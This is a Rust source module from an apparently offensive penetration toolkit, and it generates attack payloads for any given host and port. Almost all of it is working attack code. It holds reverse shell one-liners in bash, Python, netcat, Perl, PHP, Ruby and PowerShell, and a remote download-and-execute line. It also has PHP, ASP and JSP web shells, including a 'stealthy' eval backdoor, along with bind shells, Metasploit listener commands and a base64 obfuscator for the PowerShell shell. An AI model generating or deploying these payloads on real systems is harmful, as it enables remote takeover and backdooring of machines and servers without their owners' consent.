//! Payload Generators
//!
//! Reverse shells, bind shells, meterpreter-style payloads

use crate::{Result, Error, OperatingSystem, Architecture};

pub mod shells;
pub mod staged;

/// Payload trait
pub trait Payload: Send + Sync {
    fn generate(&self, lhost: &str, lport: u16) -> Result<Vec<u8>>;
    fn payload_type(&self) -> PayloadType;
    fn platform(&self) -> OperatingSystem;
    fn arch(&self) -> Architecture;
}

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum PayloadType {
    // Reverse shells
    ReverseShellTcp,
    ReverseShellHttp,
    ReverseShellHttps,

    // Bind shells
    BindShellTcp,

    // Staged
    StagedReverseTcp,
    StagedBindTcp,

    // Meterpreter-style
    MeterpreterReverseTcp,
    MeterpreterBindTcp,

    // Web
    WebShellPhp,
    WebShellAsp,
    WebShellJsp,

    // Command execution
    CmdExec,
}

impl PayloadType {
    pub fn name(&self) -> &'static str {
        match self {
            PayloadType::ReverseShellTcp => "reverse_tcp",
            PayloadType::ReverseShellHttp => "reverse_http",
            PayloadType::ReverseShellHttps => "reverse_https",
            PayloadType::BindShellTcp => "bind_tcp",
            PayloadType::StagedReverseTcp => "staged_reverse_tcp",
            PayloadType::StagedBindTcp => "staged_bind_tcp",
            PayloadType::MeterpreterReverseTcp => "meterpreter_reverse_tcp",
            PayloadType::MeterpreterBindTcp => "meterpreter_bind_tcp",
            PayloadType::WebShellPhp => "webshell_php",
            PayloadType::WebShellAsp => "webshell_asp",
            PayloadType::WebShellJsp => "webshell_jsp",
            PayloadType::CmdExec => "cmd_exec",
        }
    }
}

pub fn all_payloads() -> Vec<PayloadType> {
    vec![
        PayloadType::ReverseShellTcp,
        PayloadType::ReverseShellHttp,
        PayloadType::BindShellTcp,
        PayloadType::WebShellPhp,
        PayloadType::WebShellAsp,
        PayloadType::WebShellJsp,
        PayloadType::CmdExec,
    ]
}

/// Shell payload generator
pub struct ShellPayload;

impl ShellPayload {
    /// Generate reverse shell for platform
    pub fn reverse_shell(os: OperatingSystem, lhost: &str, lport: u16) -> String {
        match os {
            OperatingSystem::Linux => Self::linux_reverse(lhost, lport),
            OperatingSystem::Windows => Self::windows_reverse(lhost, lport),
            OperatingSystem::MacOS => Self::macos_reverse(lhost, lport),
            _ => Self::linux_reverse(lhost, lport),
        }
    }

    pub fn linux_reverse(lhost: &str, lport: u16) -> String {
        format!(r#"
# Bash reverse shell
bash -i >& /dev/tcp/{}/{} 0>&1

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python3 reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat reverse shell
nc -e /bin/sh {} {}

# Netcat without -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f

# Perl reverse shell
perl -e 'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'

# PHP reverse shell
php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby reverse shell
ruby -rsocket -e'f=TCPSocket.open("{}",{}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
"#, lhost, lport, lhost, lport, lhost, lport, lhost, lport, lhost, lport, lhost, lport, lhost, lport, lhost, lport)
    }

    pub fn windows_reverse(lhost: &str, lport: u16) -> String {
        format!(r#"
# PowerShell reverse shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{}',{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"

# PowerShell one-liner (Base64 encoded)
powershell -e {}

# Netcat for Windows
nc.exe {} {} -e cmd.exe

# Nishang Invoke-PowerShellTcp
IEX(New-Object Net.WebClient).downloadString('http://{}:{}/Invoke-PowerShellTcp.ps1')
"#, lhost, lport, base64_encode_ps(lhost, lport), lhost, lport, lhost, lport)
    }

    pub fn macos_reverse(lhost: &str, lport: u16) -> String {
        format!(r#"
# Bash reverse shell
bash -i >& /dev/tcp/{}/{} 0>&1

# Python reverse shell (macOS has python by default)
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Ruby (pre-installed on macOS)
ruby -rsocket -e'f=TCPSocket.open("{}",{}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
"#, lhost, lport, lhost, lport, lhost, lport)
    }

    /// Web shell generators
    pub fn webshell_php() -> &'static str {
        r#"<?php
// Simple PHP webshell
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}
?>

// Or more stealthy:
<?php @eval($_POST['c']); ?>

// Or using passthru:
<?php passthru($_GET['cmd']); ?>
"#
    }

    pub fn webshell_asp() -> &'static str {
        r#"<%
Dim oScript
Dim oScriptNet
Dim oFileSys, oFile
Dim szCMD, szTempFile

szCMD = Request.Form("cmd")
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szTempFile = "C:\" & oFileSys.GetTempName()
Call oScript.Run("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
Set oFile = oFileSys.OpenTextFile(szTempFile, 1, False, 0)
Response.Write(oFile.ReadAll)
oFile.Close
Call oFileSys.DeleteFile(szTempFile, True)
%>
"#
    }

    pub fn webshell_jsp() -> &'static str {
        r#"<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String dirone = dis.readLine();
    while(dirone != null) {
        out.println(dirone);
        dirone = dis.readLine();
    }
}
%>
"#
    }

    /// Bind shell payloads
    pub fn bind_shell_linux(port: u16) -> String {
        format!(r#"
# Netcat bind shell
nc -lvp {} -e /bin/sh

# Python bind shell
python -c 'import socket,os;s=socket.socket();s.bind(("0.0.0.0",{}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);os.system("/bin/sh")'

# Socat bind shell
socat TCP-LISTEN:{},reuseaddr,fork EXEC:/bin/sh
"#, port, port, port)
    }

    /// Listener commands
    pub fn listener(lport: u16) -> String {
        format!(r#"
# Netcat listener
nc -lvnp {}

# Socat listener
socat file:`tty`,raw,echo=0 tcp-listen:{},reuseaddr

# Python listener
python -c "import socket;s=socket.socket();s.bind(('0.0.0.0',{}));s.listen(1);print('[*] Listening on port {}...');c,a=s.accept();print('[+] Connection from',a);import subprocess;subprocess.call(['/bin/sh'],stdin=c,stdout=c,stderr=c)"

# Metasploit multi/handler
msfconsole -x "use exploit/multi/handler; set LHOST 0.0.0.0; set LPORT {}; run"
"#, lport, lport, lport, lport, lport)
    }
}

fn base64_encode_ps(lhost: &str, lport: u16) -> String {
    let script = format!(
        r#"$client = New-Object System.Net.Sockets.TCPClient('{}',{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"#,
        lhost, lport
    );

    // UTF-16LE encode for PowerShell
    let utf16: Vec<u8> = script.encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();

    base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &utf16)
}
